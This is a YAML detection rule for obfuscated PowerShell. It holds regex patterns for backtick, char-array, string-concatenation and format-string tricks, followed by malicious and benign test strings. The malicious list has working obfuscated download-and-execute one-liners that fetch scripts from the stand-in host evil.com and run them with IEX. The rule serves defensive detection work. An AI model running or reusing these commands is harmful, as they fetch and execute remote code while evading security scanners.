name: high-10-obfuscated
severity: high
description: >
  Detects obfuscated PowerShell commands using multiple simple patterns. Strong indicator of evasion attempts.

patterns:
  - name: backtick-obfuscation
    pattern: (?i)powershell.*(I`E`X|I`n`v`o`k`e|D`o`w`n`l`o`a`d|N`e`w`-`O`b`j`e`c`t|`E`x`p`r`e`s`s`i`o`n)
    description: Detects backtick obfuscation in PowerShell keywords

  - name: char-array-obfuscation
    pattern: (?i)powershell.*\[char\]\s*\d+.*\[char\]\s*\d+
    description: Detects char array obfuscation

  - name: string-concatenation
    pattern: (?i)powershell.*(\$\w+\s*=\s*['\"][IE]['\"].*['\"][EX]['\"]\s*;.*IEX|\$\w+\s*\+\s*\$\w+.*IEX)
    description: Detects string concatenation to build IEX command

  - name: format-string-obfuscation
    pattern: (?i)powershell.*['\"]?\{0\}\{1\}\{2\}['\"]?\s*-f\s*['\"]\w['\"]
    description: Detects format string obfuscation

  - name: string-join-obfuscation
    pattern: (?i)powershell.*\[string\]::join
    description: Detects string join obfuscation

  - name: replace-method-obfuscation
    pattern: (?i)powershell.*\.Replace\(['\"].*['\"],\s*['\"]IEX['\"]\)
    description: Detects Replace method to build IEX

  - name: ampersand-invoke-obfuscation
    pattern: (?i)powershell.*&\s*\$\w+.*['\"](IEX|Invoke-Expression|DownloadString)['\"]
    description: Detects ampersand invocation of obfuscated commands

  - name: double-backtick-obfuscation
    pattern: (?i)powershell.*I``E``X
    description: Detects double backtick obfuscation

  - name: dot-invocation-obfuscation
    pattern: (?i)powershell.*\.\(['\"][^'\"]*\+[^'\"]*['\"]\)
    description: Detects dot invocation with string concatenation

  - name: variable-multiple-assignment
    pattern: (?i)powershell.*\$\w+\s*=\s*['\"][IEX]['\"].*\$\w+\s*=\s*['\"][EX]['\"]
    description: Detects building command through multiple variable assignments

  - name: invoke-command-variable
    pattern: (?i)powershell.*&\s*\(\$\w+\s*\+\s*\$\w+.*\)
    description: Detects ampersand invocation of concatenated variables

  - name: single-letter-variable-concatenation
    pattern: (?i)powershell.*\$\w+\s*=\s*[''][IE][''].*\$\w+\s*=\s*[''][EX][''].*IEX
    description: Detects single letter variable concatenation with single quotes

  - name: ampersand-variable-invoke
    pattern: (?i)powershell.*&\s*\$\w+.*['"]IEX['"]
    description: Detects ampersand invocation of variable containing command string

  - name: format-operator-split
    pattern: (?i)powershell.*-f\s+[''][IEWX]['']
    description: Detects format operator used to split commands

malicious:
  - 'powershell -c "I`E`X (New-Object Net.WebClient).DownloadString(''http://evil.com/p.ps1'')"'
  - 'powershell -c "[char]73+[char]69+[char]88"'
  - 'powershell -c "I`n`v`o`k`e-E`x`p`r`e`s`s`i`o`n (N`e`w-O`b`j`e`c`t Net.WebClient).D`o`w`n`l`o`a`d`S`t`r`i`n`g(''http://evil.com/mal.ps1'')"'
  - 'powershell -c "$x=[char]0x49+[char]0x45+[char]0x58;IEX $x"'
  - "powershell [string]::join('',([char[]]@(73,69,88)))|IEX"
  - 'powershell -Command "$a=[char]73+[char]69+[char]88;.$a ''(New-Object Net.WebClient).DownloadString(''''http://evil.com/s.ps1'''')''"'
  - 'powershell -c "I``E``X (New-Object Net.WebClient).DownloadString(''http://evil.com/payload.ps1'')"'
  - 'powershell -c "$a=''I'';$b=''E'';$c=''X'';& ($a+$b+$c) ''payload''"'

benign:
  - 'powershell -Command "Get-Process"'
  - "powershell.exe Get-Service"
  - "powershell -File script.ps1"
  - 'powershell Write-Host "Normal string"'
  - "powershell -Command Test-Path"
  - "powershell Get-Date"
  - "powershell.exe -File C:\\Scripts\\backup.ps1"
  - 'powershell -Command "Get-EventLog -LogName Application"'
  - 'powershell -Command "Write-Output ''Hello World''"'
  - "powershell Get-Process | Where-Object Name -eq 'explorer'"
  - 'powershell -Command "$name=''John''; Write-Host $name"'
  - "powershell -File C:\\Scripts\\maintenance.ps1"
  - "powershell.exe -Command \"Get-ChildItem C:\\Temp\""
  - "powershell [System.Environment]::OSVersion"
  - 'powershell -Command "Get-Service | Format-Table"'
  - "$date = Get-Date; Write-Host $date"
